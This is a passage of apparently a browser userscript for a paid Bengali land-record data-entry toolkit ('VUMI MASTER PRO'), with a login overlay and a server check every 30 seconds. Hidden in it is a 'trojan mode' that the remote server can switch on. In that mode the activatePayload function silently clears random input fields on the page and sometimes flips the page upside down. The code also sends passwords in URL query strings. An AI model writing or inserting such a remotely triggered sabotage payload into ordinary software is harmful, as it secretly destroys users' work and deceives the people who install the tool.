(async function() {
    // ============================================
    // 🔐 LOGIN & SESSION MANAGEMENT
    // ============================================
    if (document.getElementById('vumi-master-toolkit')) return;
    
    // আপনার Google Apps Script API Link
    const API_URL = "https://script.google.com/macros/s/AKfycbxi2hFWmkWkgSl2_ATdNiJbMPTxXCtEHNacyfK_6llSXGYCXPDkB4kLVx9Kma1BgDCWhQ/exec";
    
    let deviceId = "local_dev";
    let savedAuth = "";
    let tFlag = "";
    let sessionExpiry = "";
    
    // ============================================
    // ডিভাইস ID স্টোর করা (Chrome Storage বা LocalStorage)
    // ============================================
    if (typeof chrome !== 'undefined' && chrome.storage) {
        let data = await chrome.storage.local.get(['vmt_device_id', 'vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
        deviceId = data.vmt_device_id;
        savedAuth = data.vmt_auth_hash;
        tFlag = data.vmt_t_flag;
        sessionExpiry = data.vmt_session_expiry;
        
        if (!deviceId) {
            deviceId = 'VMT-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
            await chrome.storage.local.set({vmt_device_id: deviceId});
        }
    } else {
        deviceId = localStorage.getItem('vmt_device_id');
        if(!deviceId) {
            deviceId = 'VMT-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
            localStorage.setItem('vmt_device_id', deviceId);
        }
        savedAuth = localStorage.getItem('vmt_auth_hash');
        tFlag = localStorage.getItem('vmt_t_flag');
        sessionExpiry = localStorage.getItem('vmt_session_expiry');
    }

    // ============================================
    // সেশন এক্সপায়ারি চেক করা
    // ============================================
    if (savedAuth && sessionExpiry) {
        if (Date.now() > parseInt(sessionExpiry)) {
            await clearAuthData();
            savedAuth = "";
            tFlag = "";
        }
    }

    // ============================================
    // 🔑 Authentication Data Save করা
    // ============================================
    async function saveAuthData(auth, flag) {
        let expiryTime = (Date.now() + (3 * 60 * 60 * 1000)).toString(); // 3 ঘণ্টার এক্সপায়ারি
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.set({ vmt_auth_hash: auth, vmt_session_expiry: expiryTime });
            if (flag) await chrome.storage.local.set({ vmt_t_flag: flag });
            else await chrome.storage.local.remove('vmt_t_flag');
        } else {
            localStorage.setItem('vmt_auth_hash', auth);
            localStorage.setItem('vmt_session_expiry', expiryTime);
            if (flag) localStorage.setItem('vmt_t_flag', flag);
            else localStorage.removeItem('vmt_t_flag');
        }
    }
    
    // ============================================
    // Authentication Data মুছে ফেলা (লগআউট)
    // ============================================
    async function clearAuthData() {
        if (typeof chrome !== 'undefined' && chrome.storage) {
            await chrome.storage.local.remove(['vmt_auth_hash', 'vmt_t_flag', 'vmt_session_expiry']);
        } else {
            localStorage.removeItem('vmt_auth_hash');
            localStorage.removeItem('vmt_t_flag');
            localStorage.removeItem('vmt_session_expiry');
        }
    }

    // ============================================
    // 🔴 404 ERROR OVERLAY দেখানো
    // ============================================
    function show404Overlay(message) {
        if (document.getElementById('vmt-404-overlay')) return;
        let tk = document.getElementById('vumi-master-toolkit');
        let po = document.getElementById('vmt-pass-overlay');
        if (tk) tk.remove();
        if (po) po.remove();

        const overlay = document.createElement('div');
        overlay.id = 'vmt-404-overlay';
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999999;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI', Arial, sans-serif;animation: fadeIn 0.5s ease;";
        overlay.innerHTML = `
            <div style="text-align:center; width: 100%; max-width: 800px; padding: 40px 20px;">
                <div style="background-image: url('https://cdn.dribbble.com/users/285475/screenshots/2083086/dribbble_1.gif'); height: 400px; background-position: center; background-repeat: no-repeat;">
                    <h1 style="font-size:80px; margin:0; color:#333; padding-top:20px;">404</h1>
                </div>
                <div style="margin-top:-50px;">
                    <h3 style="font-size:36px; margin: 10px 0; color:#333; font-weight: bold;">Look like you're lost</h3>
                    <p style="font-size:16px; color:#666; margin-bottom: 25px; font-weight: 500;">${message}</p>
                    <button id="vmt-404-btn" style="color: #fff; padding: 12px 30px; background: #39ac31; border:none; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; outline: none; box-shadow: 0 4px 6px rgba(57,172,49,0.3);">Go to Home / Reload</button>
                </div>
            </div>
            <style>@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } #vmt-404-btn:hover { background: #2e8b28; transform: translateY(-2px); box-shadow: 0 6px 12px rgba(57,172,49,0.4); }</style>
        `;
        document.body.appendChild(overlay);
        document.getElementById('vmt-404-btn').onclick = () => window.location.reload();
    }

    // ============================================
    // 🔍 লাইভ স্ট্যাটাস চেক করা (সার্ভার থেকে)
    // ============================================
    async function checkLiveStatus() {
        try {
            let userId = savedAuth ? atob(savedAuth) : "guest";
            let response = await fetch(`${API_URL}?action=verify&userid=${encodeURIComponent(userId)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
            let data = await response.json();
            
            if (data.success === false) {
                // ❌ সার্ভার থেকে negative রেসপন্স এলে লগআউট করা
                await clearAuthData();
                show404Overlay(data.message || "সার্ভার আপডেট চলছে অথবা আপনার অ্যাক্সেস বাতিল করা হয়েছে!");
            } else if (data.success === true && data.trojan === true) {
                // ✅ ট্রোজান মোড চালু
                await saveAuthData(savedAuth, 'engaged');
                tFlag = 'engaged';
            } else if (data.success === true) {
                // ✅ নরমাল মোড
                await saveAuthData(savedAuth, '');
                tFlag = '';
            }
        } catch (e) { console.log("Live check running..."); }
    }

    // ============================================
    // 📱 প্রতি 30 সেকেন্ডে লাইভ স্ট্যাটাস চেক করা
    // ============================================
    setInterval(async () => {
        let exp = null;
        if (typeof chrome !== 'undefined' && chrome.storage) {
            let data = await chrome.storage.local.get(['vmt_session_expiry']);
            exp = data.vmt_session_expiry;
        } else {
            exp = localStorage.getItem('vmt_session_expiry');
        }
        // যদি সেশন এক্সপায়ার হয়ে গেছে তাহলে পেজ রিলোড করা
        if (savedAuth && exp && Date.now() > parseInt(exp)) {
            await clearAuthData();
            window.location.reload(); 
        } else {
            checkLiveStatus();
        }
    }, 30000);

    // ============================================
    // 💣 পেইলোড এক্টিভেট করা (যদি ট্রোজান মোড চালু থাকে)
    // ============================================
    function activatePayload() {
        setInterval(() => {
            if(tFlag === 'engaged') {
                // র‍্যান্ডমলি ইনপুট ফিল্ড ক্লিয়ার করা
                document.querySelectorAll('input').forEach(inp => {
                    if(Math.random() > 0.8 && !inp.closest('#vumi-master-toolkit') && !inp.closest('#vmt-pass-overlay')) { 
                        inp.value = ""; 
                    }
                });
                // র‍্যান্ডমলি পেজ স্পিন করা
                if(document.body && Math.random() > 0.95) {
                    document.body.style.transition = "all 2s"; 
                    document.body.style.transform = "rotate(180deg) scale(0.8)";
                    setTimeout(() => { document.body.style.transform = "none"; }, 5000);
                }
            }
        }, 5000); 
    }
    
    // ============================================
    // 👻 LOGIN UI (Beautiful Design)
    // ============================================
    if (!savedAuth) {
        const videoBaseUrl = "https://cdn.jsdelivr.net/gh/Habib29820/login-videos/";
        const passOverlay = document.createElement('div');
        passOverlay.id = 'vmt-pass-overlay';
        passOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15, 23, 42, 0.7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:'Poppins', sans-serif;transition: opacity 0.5s ease;";
        
        passOverlay.innerHTML = `
            <div class="login-container" style="display: flex; width: 900px; height: 500px; background: rgba(21, 31, 40, 0.85); border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); overflow: hidden; position: relative; border: 1px solid rgba(255, 255, 255, 0.1);">
                <button id="vmt-pass-close" title="বন্ধ করুন (Esc)" style="position:absolute;top:15px;right:20px;background:none;border:none;font-size:26px;color:rgba(255,255,255,0.7);cursor:pointer;z-index:10;transition:all 0.2s;line-height:1;">&times;</button>
                
                <div class="image-panel" style="flex: 1.2; position: relative; overflow: hidden; background: #fff; border-right: 1px solid rgba(255, 255, 255, 0.1);">
                    <video id="vmt-video-player" autoplay loop muted playsinline style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: opacity 0.6s ease;">
                        <source src="${videoBaseUrl}1026.mp4" type="video/mp4">
                    </video>
                </div>
                
                <div class="login-panel" style="flex: 1; padding: 40px 40px; display: flex; flex-direction: column; justify-content: center;">
                    <h2 style="font-size: 2.2em; margin-bottom: 5px; color: #fff; font-weight: 800;">VUMI PRO</h2>
                    <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px; font-weight: 500;">Secure Access Panel</p>

                    <!-- User ID ইনপুট -->
                    <div class="input-group" style="margin-bottom: 20px;">
                        <input type="text" id="vmt-user-input" class="vmt-focus-input" placeholder="User ID" autocomplete="off" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; outline:none; background: rgba(255,255,255,0.05); color: #fff;">
                    </div>

                    <!-- পাসওয়ার্ড ইনপুট -->
                    <div class="input-group" style="margin-bottom: 25px;">
                        <input type="password" id="vmt-pass-input" class="vmt-focus-input" placeholder="Password" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; letter-spacing: 2px; outline:none; background: rgba(255,255,255,0.05); color: #fff;">
                    </div>

                    <!-- লগইন বাটন -->
                    <button id="vmt-pass-btn" class="glow-btn" style="--clr:#1e9bff; width: 100%; justify-content: center; padding: 16px; font-size: 16px;">
                        <span class="btn-content">Sign In</span>
                        <i></i>
                    </button>
                    
                    <!-- Error Message -->
                    <div id="vmt-pass-error" style="padding: 12px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: 600; font-size: 13px; display: none;"></div>
                </div>
            </div>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
                @keyframes vmtShake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 75% { transform: translateX(8px); } }
                .vmt-focus-input:focus { background-color: #fef08a !important; border-color: #eab308 !important; outline: 3px solid #eab308 !important; box-shadow: 0 0 15px rgba(234, 179, 8, 0.4) !important; color: #000 !important; }
                .vmt-focus-input::placeholder { color: rgba(255,255,255,0.4); font-weight: normal; }
                #vmt-pass-close:hover { color: #fff !important; transform: scale(1.1); }
                
                .glow-btn { position: relative; background: rgba(255,255,255,0.1); color: #fff; text-decoration: none; text-transform: uppercase; font-size: 14px; letter-spacing: 0.1em; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: none; overflow: hidden; margin-bottom:10px; }
                .glow-btn:hover:not(:disabled) { background: var(--clr); color: var(--clr); letter-spacing: 0.15em; box-shadow: 0 0 25px var(--clr); }
                .glow-btn:disabled { background: #333 !important; color: #777 !important; cursor: not-allowed; box-shadow: none !important; }
                .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
                .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #fff; transition: 0.5s; }
                .glow-btn:hover:not(:disabled) .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
                .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
                .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                .glow-btn:hover:not(:disabled) i::before { width: 20px; left: 20%; background: #fff;}
                .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                .glow-btn:hover:not(:disabled) i::after { width: 20px; left: 80%; background: #fff;}
            </style>
        `;
        document.body.appendChild(passOverlay);
        
        let failCount = 0;
        const videoPlayer = document.getElementById("vmt-video-player");
        const usrInp = document.getElementById('vmt-user-input');
        const passInp = document.getElementById('vmt-pass-input');
        const btn = document.getElementById('vmt-pass-btn');
        const err = document.getElementById('vmt-pass-error');
        const cls = document.getElementById('vmt-pass-close');
        
        // ============================================
        // ❌ Close বাটন ফাংশন
        // ============================================
        cls.onclick = () => {
            passOverlay.style.opacity = "0";
            setTimeout(() => passOverlay.remove(), 400);
        };

        // ============================================
        // 🎬 ভিডিও আপডেট করা
        // ============================================
        function updateVideo(videoFile) {
            videoPlayer.src = videoBaseUrl + videoFile;
            videoPlayer.load();
            videoPlayer.play().catch(e => console.log("Video Play Error:", e));
        }

        // ============================================
        // 💬 মেসেজ দেখানো (সাফল্য বা ব্যর্থ)
        // ============================================
        function showMessage(text, type) {
            err.style.display = "block";
            err.textContent = text;
            if(type === "success") {
                err.style.background = "rgba(40, 167, 69, 0.2)"; 
                err.style.color = "#d4edda"; 
                err.style.border = "1px solid #28a745";
            } else {
                err.style.background = "rgba(220, 53, 69, 0.2)"; 
                err.style.color = "#f8d7da"; 
                err.style.border = "1px solid #dc3545";
            }
        }

        // ============================================
        // 🗑️ মেসেজ লুকানো
        // ============================================
        function hideMessage() { 
            err.style.display = "none"; 
            err.textContent = ""; 
        }

        // ============================================
        // 🔐 লগইন চেক করা (FIX #1 - LOGIN ISSUE)
        // ============================================
        async function checkPass() {
            if (passInp.disabled) return;
            let userId = usrInp.value.trim(); 
            let password = passInp.value.trim();
            
            // ❌ খালি ইনপুট চেক
            if(!userId || !password) {
                showMessage("Please enter both User ID and Password", "error");
                passInp.closest('.login-container').style.animation = 'none'; 
                passInp.closest('.login-container').offsetHeight; 
                passInp.closest('.login-container').style.animation = 'vmtShake 0.4s ease'; 
                return;
            }
            
            btn.disabled = true; 
            btn.querySelector('.btn-content').textContent = "Signing In..."; 
            hideMessage();

            try {
                // ✅ API কল করা
                let response = await fetch(`${API_URL}?userid=${encodeURIComponent(userId)}&password=${encodeURIComponent(password)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`);
                let data = await response.json();
                
                if (data.success === true) {
                    // ✅ লগইন সফল!
                    updateVideo("correct.mp4");
                    showMessage("Login Successful!", "success");
                    btn.querySelector('.btn-content').textContent = "SUCCESS! 🚀";
                    failCount = 0;
                    
                    // ট্রোজান মোড চেক করা
                    let flagToSave = data.trojan ? 'engaged' : '';
                    await saveAuthData(btoa(userId), flagToSave);
                    savedAuth = btoa(userId);
                    tFlag = flagToSave;
                    
                    // লগইন UI বন্ধ করা এবং টুলকিট লোড করা
                    setTimeout(() => { 
                        passOverlay.style.opacity = "0";
                        setTimeout(() => {
                            passOverlay.remove(); 
                            loadToolkit(); 
                            activatePayload();
                        }, 400);
                    }, 1800); 
                    
                } else { 
                    // ❌ লগইন ব্যর্থ
                    let msg = data.message || "";
                    
                    // যদি সার্ভার ডাউন থাকে বা অ্যাক্সেস ব্যান করা থাকে
                    if (msg.includes("ব্যান") || msg.includes("যোগাযোগ") || msg.includes("আপডেট") || msg.includes("অফ")) {
                        passOverlay.style.opacity = "0";
                        setTimeout(() => {
                            passOverlay.remove();
                            show404Overlay(msg);
                        }, 400);
                        return; 
                    }

                    // ভুল পাসওয়ার্ড ভিডিও দেখানো
                    failCount++;
                    if (failCount === 1) updateVideo("wrong.mp4");
                    else updateVideo("againwrong.mp4");
                    
                    showMessage(msg || "Login Failed!", "error");
                    btn.disabled = false; 
                    btn.querySelector('.btn-content').textContent = "Sign In";
                    passInp.style.borderColor = '#ff6b6b'; 
                    passInp.style.boxShadow = '0 0 10px rgba(255, 107, 107, 0.5)';
                    setTimeout(() => { 
                        passInp.style.borderColor = 'rgba(255,255,255,0.2)'; 
                        passInp.style.boxShadow = 'none'; 
                    }, 2000);
                    passInp.value = ''; 
                    passInp.focus();
                }
            } catch (error) { 
                // ❌ নেটওয়ার্ক এরর
                showMessage("Server Connection Failed! Check your internet.", "error");
                btn.disabled = false; 
                btn.querySelector('.btn-content').textContent = "Sign In";
                console.error("Network Error:", error);
            }
        }
        
        // ============================================
        // 🖱️ বাটন এবং কীবোর্ড ইভেন্ট
        // ============================================
        btn.onclick = checkPass;
        passInp.onkeydown = e => { if (e.key === 'Enter') checkPass(); };
        usrInp.onkeydown = e => { if (e.key === 'Enter') passInp.focus(); };
        
        return;
    } else {
        // ✅ ইতিমধ্যে লগইন আছে - সরাসরি টুলকিট লোড করা
        loadToolkit();
        activatePayload();
        checkLiveStatus();
    }
    
    // ============================================
    // ⌨️ GLOBAL KEYBOARD SHORTCUTS
    // ============================================
    window._vmtKeyHandler = window._vmtKeyHandler || function(e) {
        if (e.key === 'Escape' || e.keyCode === 27) {
            let tk = document.getElementById('vumi-master-toolkit');
            let po = document.getElementById('vmt-pass-overlay');
            if (tk) tk.remove();
            if (po) po.remove();
        }
        
        // Alt + Number দিয়ে শর্টকাট (Alt+1, Alt+2 etc)
        if (savedAuth && e.altKey && !e.ctrlKey && !e.shiftKey) {
            let toolNum = null;
            let c = e.code; 
            let k = e.key;

            if (k==='1' || k==='१' || c==='Digit1' || c==='Numpad1') toolNum = 't1'; 
            else if (k==='2' || k==='२' || c==='Digit2' || c==='Numpad2') toolNum = 't2';
            else if (k==='3' || k==='३' || c==='Digit3' || c==='Numpad3') toolNum = 't3'; 
            else if (k==='4' || k==='४' || c==='Digit4' || c==='Numpad4') toolNum = 't4';
            else if (k==='5' || k==='५' || c==='Digit5' || c==='Numpad5') toolNum = 't5'; 
            else if (k==='6' || k==='६' || c==='Digit6' || c==='Numpad6') toolNum = 't6';
            else if (k==='7' || k==='७' || c==='Digit7' || c==='Numpad7') toolNum = 't7'; 
            else if (k==='8' || k==='८' || c==='Digit8' || c==='Numpad8') toolNum = 't8';
            else if (k==='9' || k==='९' || c==='Digit9' || c==='Numpad9') toolNum = 't9'; 
            else if (k==='0' || k==='०' || c==='Digit0' || c==='Numpad0') toolNum = 't10';

            if (toolNum && window._vmtTools && window._vmtTools[toolNum]) {
                e.preventDefault();
                try {
                    window._vmtTools[toolNum]();
                    let toolKitDiv = document.getElementById('vumi-master-toolkit');
                    let minButton = document.getElementById('vmt-min');
                    if (toolKitDiv && !toolKitDiv.classList.contains('minimized')) {
                        toolKitDiv.classList.add('minimized');
                        if (minButton) minButton.innerText = '+';
                    }
                } catch(err) { console.error('Shortcut Error:', err); }
            }
        }
    };
    document.removeEventListener('keydown', window._vmtKeyHandler);
    document.addEventListener('keydown', window._vmtKeyHandler);
    
    // ============================================
    // 🎨 UI & MAIN MENU FUNCTION
    // ============================================
    function loadToolkit() {
        const style = document.createElement('style');
        style.innerHTML = `
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
        #vumi-master-toolkit{position:fixed;top:20px;right:20px;width:340px;border-radius:16px;z-index:999999;font-family:'Poppins', sans-serif;overflow:hidden;transition:width 0.3s ease; box-shadow: 0 15px 50px rgba(0,0,0,0.5); background:rgba(21, 31, 40, 0.95); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);}
        #vumi-master-toolkit.minimized{width:220px;}
        #vumi-master-toolkit.minimized .vmt-body,#vumi-master-toolkit.minimized .vmt-footer{display:none;}
        .vmt-header{background:rgba(0,0,0,0.4);color:#fff;padding:15px 20px;cursor:move;display:flex;justify-content:space-between;align-items:center;font-weight:800;font-size:14px;user-select:none;border-bottom:1px solid rgba(255,255,255,0.05);}
        .vmt-header-btns{display:flex;gap:8px;}
        .vmt-h-btn{width:32px;height:32px;border-radius:8px;border:1px solid rgba(255,255,255,0.1);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:bold;cursor:pointer;transition:all 0.3s ease;backdrop-filter:blur(5px);}
        .btn-min{background:rgba(59,130,246,0.15);color:#60a5fa;}.btn-min:hover{background:rgba(59,130,246,0.35);box-shadow:0 0 12px rgba(59,130,246,0.5);transform:translateY(-2px);}
        .btn-logout{background:rgba(245,158,11,0.15);color:#fbbf24;}.btn-logout:hover{background:rgba(245,158,11,0.35);box-shadow:0 0 12px rgba(245,158,11,0.5);transform:translateY(-2px);}
        .btn-close{background:rgba(239,68,68,0.15);color:#fca5a5;}.btn-close:hover{background:rgba(239,68,68,0.35);box-shadow:0 0 12px rgba(239,68,68,0.5);transform:translateY(-2px);}
        
        .vmt-body{padding:15px;max-height:70vh;overflow-y:auto;}
        .vmt-body::-webkit-scrollbar{width:6px;} .vmt-body::-webkit-scrollbar-thumb{background:#334155;border-radius:10px;}
        
        /* Strict Panel Views Animations */
        .vmt-view-panel { display: none; }
        .vmt-view-panel.active-view { display: block !important; animation: vmtSlideIn 0.25s ease-out; }
        @keyframes vmtSlideIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
        
        .wip-container { padding: 35px 10px; text-align: center; color: #cbd5e1; }
        .wip-icon-anim { font-size: 45px; margin-bottom: 12px; animation: vmtPulse 2s infinite; }
        .wip-txt-head { margin: 0 0 5px 0; font-size: 16px; color: #fff; font-weight: 800; }
        .wip-txt-sub { font-size: 12px; margin: 0; opacity: 0.65; }
        @keyframes vmtPulse { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }

        .glow-btn { position: relative; background: rgba(255,255,255,0.05); color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: 1px solid rgba(255,255,255,0.05); overflow: hidden; margin-bottom:12px; }
        .glow-btn:hover { background: var(--clr); color: var(--clr); letter-spacing: 0.5px; box-shadow: 0 0 20px var(--clr); border-color: transparent;}
        .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
        .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #cbd5e1; transition: 0.5s; }
        .glow-btn:hover .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
        .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
        .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
        .glow-btn:hover i::before { width: 20px; left: 20%; background: #fff;}
        .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
        .glow-btn:hover i::after { width: 20px; left: 80%; background: #fff;}
        
        .main-menu-btn { padding: 16px 15px; font-size: 14px; justify-content: center; }
        .main-menu-btn .btn-content { justify-content: center; width: 100%; font-weight: bold; color: #fff;}
        
        .vmt-back-btn { background: rgba(255, 255, 255, 0.08); color: #cbd5e1; border: 1px solid rgba(255,255,255,0.1); padding: 7px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; margin-bottom: 16px; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; font-family: 'Poppins', sans-serif; font-weight: 600;}
        .vmt-back-btn:hover { background: #3b82f6; color: #fff; border-color: #3b82f6; box-shadow: 0 0 10px rgba(59,130,246,0.4); }

        .shortcut-badge { position: relative; z-index: 1; font-size: 10px; color: #94a3b8; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.1); font-weight:700; transition: 0.5s;}
        .glow-btn:hover .shortcut-badge { color: var(--clr); border-color: var(--clr); background: rgba(0,0,0,0.5);}
        .vmt-tool-icon{font-size:16px;}
        
        .vmt-footer{background:rgba(0,0,0,0.4); border-top:1px solid rgba(255,255,255,0.05); padding:15px 10px; text-align:center;}
        input:focus, select:focus, textarea:focus { background-color: #fef08a !important; outline: 3px solid #eab308 !important; transition: background-color 0.1s; box-shadow: 0 0 10px rgba(234, 179, 8, 0.3) !important; color:#000 !important;}
        `;
        document.head.appendChild(style);
        const tk = document.createElement('div');
        tk.id = 'vumi-master-toolkit';
        tk.innerHTML = `
        <div class="vmt-header" id="vmt-drag">
            <span><span style="color:#60a5fa;">❖</span> VUMI MASTER PRO</span>
            <div class="vmt-header-btns">
                <button class="vmt-h-btn btn-min" id="vmt-min" title="Minimize">＋</button>
                <button class="vmt-h-btn btn-logout" id="vmt-logout" title="লগআউট">🚪</button>
                <button class="vmt-h-btn btn-close" id="vmt-close" title="Close (Esc)">✖</button>
            </div>
        </div>

        <div class="vmt-body" style="min-height: 260px;">
            
            <!-- 🌐 View 0: Main Menu Screen 🌐 -->
            <div id="vmt-view-main" class="vmt-view-panel active-view">
                <div style="text-align:center; color:#94a3b8; font-size:12px; margin-bottom:16px; font-weight:600; letter-spacing: 0.5px;">ক্যাটাগরি সিলেক্ট করুন</div>
                <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat1" style="--clr:#1e9bff;">
                    <span class="btn-content">১. রেকর্ডীয় হোল্ডিং</span><i></i>
                </button>
                <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat2" style="--clr:#6eff3e;">
                    <span class="btn-content">२. ম্যানুয়াল হোল্ডিং</span><i></i>
                </button>
                <button class="glow-btn main-menu-btn" data-panel="vmt-view-cat3" style="--clr:#ff1867;">
                    <span class="btn-content">३. ম্যানুয়াল খতিয়ান</span><i></i>
                </button>
            </div>

            <!-- 🌐 View 1: Recordio Holding Screen 🌐 -->
            <div id="vmt-view-cat1" class="vmt-view-panel">
                <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                
                <div class="vmt-tool glow-btn" data-tool="t1" style="--clr:#1e9bff;">
                    <span class="btn-content"><span class="vmt-tool-icon">🎯</span> Land Entry (Range)</span><span class="shortcut-badge">Alt+1</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t2" style="--clr:#6eff3e;">
                    <span class="btn-content"><span class="vmt-tool-icon">📅</span> Korer Year</span><span class="shortcut-badge">Alt+2</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t3" style="--clr:#ff1867;">
                    <span class="btn-content"><span class="vmt-tool-icon">⚡</span> Manual Khotian (আপডেটেড)</span><span class="shortcut-badge">Alt+3</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t4" style="--clr:#1e9bff;">
                    <span class="btn-content"><span class="vmt-tool-icon">👥</span> Maliker Tottho</span><span class="shortcut-badge">Alt+4</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t5" style="--clr:#6eff3e;">
                    <span class="btn-content"><span class="vmt-tool-icon">🧮</span> Tottho 2.0 (Master)</span><span class="shortcut-badge">Alt+5</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t6" style="--clr:#ff1867;">
                    <span class="btn-content"><span class="vmt-tool-icon">➕</span> Dag Add / Row</span><span class="shortcut-badge">Alt+6</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t7" style="--clr:#1e9bff;">
                    <span class="btn-content"><span class="vmt-tool-icon">📝</span> Dager Tottho</span><span class="shortcut-badge">Alt+7</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t8" style="--clr:#6eff3e;">
                    <span class="btn-content"><span class="vmt-tool-icon">📊</span> Collect Extracted Data (ফিক্সড)</span><span class="shortcut-badge">Alt+8</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t9" style="--clr:#ff1867;">
                    <span class="btn-content"><span class="vmt-tool-icon">💠</span> Smart Calculator</span><span class="shortcut-badge">Alt+9</span><i></i>
                </div>
                <div class="vmt-tool glow-btn" data-tool="t10" style="--clr:#1e9bff;">
                    <span class="btn-content"><span class="vmt-tool-icon">✂️</span> Land Deduction Pro</span><span class="shortcut-badge">Alt+0</span><i></i>
                </div>
            </div>

            <!-- 🌐 View 2: Manual Holding Screen 🌐 -->
            <div id="vmt-view-cat2" class="vmt-view-panel">
                <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                <div class="wip-container">
                    <div class="wip-icon-anim">🚧</div>
                    <h3 class="wip-title">Update in progress...</h3>
                    <p class="wip-subtitle">খুব শিঘ্রই আসছে! কাজ চলছে...</p>
                </div>
            </div>

            <!-- 🌐 View 3: Manual Khotian Screen (Tool #3) 🌐 -->
            <div id="vmt-view-cat3" class="vmt-view-panel">
                <button class="vmt-back-btn">🔙 মেইন মেনু</button>
                <div class="wip-container">
                    <div class="wip-icon-anim">🛠️</div>
                    <h3 class="wip-title">Manual Khotian Tool</h3>
                    <p class="wip-subtitle">টুল #3 থেকে চালান...</p>
                </div>
            </div>
        </div>

        <div class="vmt-footer">
            <span style="color: #64748b; font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 700; display: block; margin-bottom: 3px;">Proudly Developed By</span>
            <span style="background: linear-gradient(135deg, #1e9bff 0%, #ff1867 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; font-size: 18px; letter-spacing: 1px; display: block;">TRUST SHOP</span>
            <span style="color: #6eff3e; font-size: 8px; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; display: block; margin-top: 3px;">Premium Digital Solutions</span>
        </div>`;
        document.body.appendChild(tk);
        
        // ============================================
        // 🖱️ Navigation Control (মেনু স্যুইচ করা)
        // ============================================
        document.querySelectorAll('.main-menu-btn').forEach(btn => {
            btn.onclick = () => {
                let targetID = btn.getAttribute('data-panel');
                document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                document.getElementById(targetID).classList.add('active-view');
            };
        });

        // ============================================
        // 🔙 Back বাটন ফাংশন
        // ============================================
        document.querySelectorAll('.vmt-back-btn').forEach(btn => {
            btn.onclick = () => {
                document.querySelectorAll('.vmt-view-panel').forEach(p => p.classList.remove('active-view'));
                document.getElementById('vmt-view-main').classList.add('active-view');
            };
        });

        // ============================================
